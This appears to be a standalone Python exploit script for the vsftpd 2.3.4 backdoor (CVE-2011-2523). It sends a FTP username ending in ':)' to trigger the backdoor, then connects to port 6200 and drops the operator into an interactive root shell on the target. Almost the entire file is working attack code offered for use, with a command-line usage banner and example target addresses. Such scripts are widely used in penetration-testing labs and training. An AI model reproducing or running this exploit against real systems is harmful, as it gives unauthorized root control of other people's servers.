#!/usr/bin/env python3
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# CVE: CVE-2011-2523

import socket
import sys
import time

def exploit(target_ip, ftp_port=21, backdoor_port=6200):
    """
    Exploits vsftpd 2.3.4 backdoor vulnerability.
    The backdoor is triggered by sending a username ending with :) (smiley face)
    """

    print(f"[*] Attempting to exploit vsftpd 2.3.4 on {target_ip}")
    print(f"[*] FTP Port: {ftp_port}, Backdoor Port: {backdoor_port}")

    try:
        # Step 1: Connect to FTP and trigger the backdoor
        print("[*] Connecting to FTP service...")
        ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_sock.settimeout(10)
        ftp_sock.connect((target_ip, ftp_port))

        # Receive banner
        banner = ftp_sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"[+] Banner: {banner.strip()}")

        if "2.3.4" not in banner:
            print("[!] Warning: Target may not be running vsftpd 2.3.4")

        # Step 2: Send malicious username with :) to trigger backdoor
        print("[*] Sending malicious USER command...")
        ftp_sock.send(b"USER nergal:)\r\n")
        time.sleep(1)

        response = ftp_sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"[+] Response: {response.strip()}")

        # Send password
        print("[*] Sending PASS command...")
        ftp_sock.send(b"PASS backdoor\r\n")
        time.sleep(1)

        try:
            response = ftp_sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] Response: {response.strip()}")
        except socket.timeout:
            print("[*] No response (expected for backdoor)")

        ftp_sock.close()

        # Step 3: Wait a moment for backdoor to open
        print("[*] Waiting for backdoor to open...")
        time.sleep(2)

        # Step 4: Connect to backdoor shell on port 6200
        print(f"[*] Attempting to connect to backdoor on port {backdoor_port}...")
        backdoor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_sock.settimeout(5)

        try:
            backdoor_sock.connect((target_ip, backdoor_port))
            print("[+] SUCCESS! Backdoor shell opened!")
            print("[+] You now have a root shell")
            print("[*] Type commands (type 'exit' to quit)")
            print("-" * 50)

            # Interactive shell
            backdoor_sock.settimeout(None)
            backdoor_sock.send(b"id\n")

            while True:
                try:
                    # Set a timeout for receiving data
                    backdoor_sock.settimeout(0.5)
                    try:
                        data = backdoor_sock.recv(4096)
                        if data:
                            print(data.decode('utf-8', errors='ignore'), end='')
                    except socket.timeout:
                        pass

                    # Get user input
                    backdoor_sock.settimeout(None)
                    cmd = input()

                    if cmd.strip().lower() == 'exit':
                        print("[*] Exiting...")
                        break

                    backdoor_sock.send((cmd + "\n").encode())

                except KeyboardInterrupt:
                    print("\n[*] Interrupted by user")
                    break
                except Exception as e:
                    print(f"[!] Error during interaction: {e}")
                    break

            backdoor_sock.close()

        except socket.timeout:
            print("[!] Connection to backdoor port timed out")
            print("[!] The backdoor may not have been triggered")
            return False
        except ConnectionRefusedError:
            print("[!] Connection to backdoor port refused")
            print("[!] The backdoor is not listening on port 6200")
            return False

    except socket.timeout:
        print("[!] Connection to FTP service timed out")
        return False
    except ConnectionRefusedError:
        print("[!] Connection to FTP service refused")
        print("[!] Make sure the target is running vsftpd on port 21")
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

    return True

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_vsftpd.py <target_ip> [ftp_port] [backdoor_port]")
        print("Example: python3 exploit_vsftpd.py 192.168.1.100")
        print("Example: python3 exploit_vsftpd.py 192.168.1.100 21 6200")
        sys.exit(1)

    target = sys.argv[1]
    ftp_port = int(sys.argv[2]) if len(sys.argv) > 2 else 21
    backdoor_port = int(sys.argv[3]) if len(sys.argv) > 3 else 6200

    exploit(target, ftp_port, backdoor_port)
